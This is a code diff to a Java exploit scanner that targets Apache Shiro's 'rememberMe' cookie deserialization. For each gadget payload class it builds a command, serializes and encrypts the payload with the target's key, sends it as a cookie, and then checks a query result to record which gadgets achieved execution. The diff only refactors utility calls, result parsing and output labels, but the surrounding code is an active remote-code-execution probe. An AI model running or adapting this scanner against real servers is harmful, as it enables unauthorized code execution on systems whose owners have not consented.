@@ -48,15 +48,14 @@ public class GadgetScanner implements ShiroScanner {
         Set<Class<? extends ObjectPayload>> set = Payload.getAllPayloadClass();
         set.remove(ScanKey.class);
         for (Class<? extends ObjectPayload> payloadClass : set) {
-            Util util = new Util();
             ShiroHttpConnection connection = new ShiroHttpConnection(target.getBase());
             String id = RandomID.randomID();
             String command = String.format(commandTemplate, identifier, id);
             ObjectPayload obj = payloadClass.newInstance();
             System.out.println("[+] Test Gadget: " + payloadClass.getSimpleName());
             Object payload = obj.getObjectPayload(command);
-            byte[] serialize = util.serialize(payload);
-            String rememberMe = util.getRememberMe(serialize, target.getKey());
+            byte[] serialize = Util.serialize(payload);
+            String rememberMe = Util.getRememberMe(serialize, target.getKey());
             connection.sendRememberMe(rememberMe, false);
 
             Thread.sleep(500);
@@ -67,15 +66,15 @@ public class GadgetScanner implements ShiroScanner {
             String queryResult = scanner.hasNextLine() ? scanner.nextLine() : "";
             // parse json
             JSONObject json = JSONObject.parseObject(queryResult);
-            if (json.toString().equals("[]")) {
+            if (json.get("data").toString().equals("[]")) {
                 continue;
             }
             UsefulGadget.add(payloadClass.getSimpleName());
             System.err.println("[*] Found Gadget: " + payloadClass.getSimpleName());
         }
 
-        System.out.println("########Useful Gadget##########");
+        System.out.println("########Available Gadget##########");
         UsefulGadget.forEach(System.out::println);
-        System.out.println("########Useful Gadget##########");
+        System.out.println("########Available Gadget##########");
     }
 }
